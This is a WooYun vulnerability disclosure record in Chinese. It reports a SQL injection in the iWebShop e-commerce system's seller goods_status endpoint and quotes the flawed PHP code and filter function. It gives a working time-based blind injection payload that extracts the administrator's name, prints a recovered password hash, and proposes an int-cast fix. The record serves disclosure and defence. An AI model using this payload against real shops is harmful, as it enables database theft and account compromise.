{"id": 40142, "wybug_id": "wooyun-2015-092355", "wybug_title": "Iwebshop最新版SQL注入第一枚", "wybug_corp": "aircheng.com", "wybug_author": "路人甲", "wybug_date": "2015-04-09 12:35", "wybug_open_date": "2015-07-13 12:37", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "源码分析", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-14：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-13：\t细节向公众公开  简要描述： Iwebshop最新版SQL注入第一枚 详细说明：  看到wooyun上有人提了几个iweshop（2014-11-18更新）的漏洞（ WooYun: iWebShop开源电子商务系统SQL注入漏洞 ），去官网看了看，在2014-12-16 已更新到了 iwebshop2.9.14121000，下下来研究研究，希望不要重复。注入一枚：POST /index.php?controller=seller&action=goods_status&is_del=2   post：id[]存在注入，文件在/controllers/seller.php的goods_status方法中看看代码/controllers/seller.php\n//商品状态修改\tpublic function goods_status()\t{\t    $id        = IFilter::act(IReq::get('id'));\t\t$is_del    = IFilter::act(IReq::get('is_del'),'int');\t\t$is_del    = $is_del === 0 ? 3 : $is_del; //不能等于0直接上架\t\t$seller_id = $this->seller['seller_id'];\t\t$goodsDB = new IModel('goods');\t\t$goodsDB->setData(array('is_del' => $is_del));\t    if($id)\t\t{\t\t\tif(is_array($id))\t\t\t{\t\t\t\tforeach($id as $key => $val)\t\t\t\t{\t\t\t\t\t$goodsDB->update(\"id = \".$val.\" and seller_id = \".$seller_id);\t\t\t\t}\t\t\t}\t\t\telse\t\t\t{\t\t\t\t$goodsDB->update(\"id = \".$val.\" and seller_id = \".$seller_id);\t\t\t}\t\t}\t\t$this->redirect(\"goods_list\");\t}\nId是这样获得的$id  = IFilter::act(IReq::get('id'));，去看看IFilter::act/lib/core/util/filter_class.php\n/**\t * @brief 对字符串进行过滤处理\t * @param  string $str      被过滤的字符串\t * @param  string $type     过滤数据类型 值: int, float, string, text, bool, url\t * @param  int    $limitLen 被输入的最大字符个数 , 默认不限制;\t * @return string 被过滤后的字符串\t * @note   默认执行的是string类型的过滤\t */\tpublic static function act($str,$type = 'string',$limitLen = false)\t{\t\tif(is_array($str))\t\t{\t\t\tforeach($str as $key => $val)\t\t\t{\t\t\t\t$resultStr[$key] = self::act($val, $type, $limitLen);\t\t\t}\t\t\treturn $resultStr;\t\t}\t\telse\t\t{\t\t\tswitch($type)\t\t\t{\t\t\t\tcase \"int\":\t\t\t\t\treturn intval($str);\t\t\t\t\tbreak;\t\t\t\tcase \"float\":\t\t\t\t\treturn floatval($str);\t\t\t\t\tbreak;\t\t\t\tcase \"text\":\t\t\t\t\treturn self::text($str,$limitLen);\t\t\t\t\tbreak;\t\t\t\tcase \"bool\":\t\t\t\t\treturn (bool)$str;\t\t\t\t\tbreak;\t\t\t\tcase \"url\":\t\t\t\t\treturn self::clearUrl($str);\t\t\t\t\tbreak;\t\t\t\tcase \"filename\":\t\t\t\t\treturn self::fileName($str);\t\t\t\t\tbreak;\t\t\t\tdefault:\t\t\t\t\treturn self::string($str,$limitLen);\t\t\t\t\tbreak;\t\t\t}\t\t}\t}\n因为在获取id时，$id        = IFilter::act(IReq::get('id')); act()没有指定第二个类型参数，所以，把id当作string过滤，这里是数字型的，不用闭合单引号，造成注入。测试方法：申请开店后，在商家管理页面->商品列表->选择商品->下架Payload:POST提交\nid%5B%5D=1 and(select if(ord(mid((select admin_name from iwebshop_admin limit 0,1),1,1))=97,sleep(1),0))\n因为是time-based blind 注入，猜测管理员用户名的第一个字母时，若错误，延迟2s左右，如下图\n\n若正确，延迟3s左右，如下图\n\n按上面的方法依次做下去（burp intruder或者自己写个脚本跑），可测试管理员用户名为：admin，密码为： f6fdffe48c908deb0f4c3bd36c032e72   漏洞证明：  见 详细说明   修复方案：  $id = IFilter::act(IReq::get('id'),'int');   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-07-13 12:37 厂商回复：  漏洞Rank：8  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}